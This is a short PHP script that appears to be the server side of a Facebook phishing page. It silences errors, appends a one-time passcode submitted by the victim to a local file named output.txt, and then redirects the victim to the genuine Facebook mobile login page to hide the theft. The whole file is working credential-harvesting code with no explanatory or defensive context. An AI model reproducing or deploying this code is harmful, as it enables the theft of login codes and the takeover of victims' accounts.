<?php
error_reporting(0);
ini_set('display_errors', 0);
file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F300229703845110%2F&email=&li=Xr-FX6llH0yTNwCDaujevHkt&e=1348092&shbl=1&refsrc=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F300229703845110%2F&_rdr');
exit();
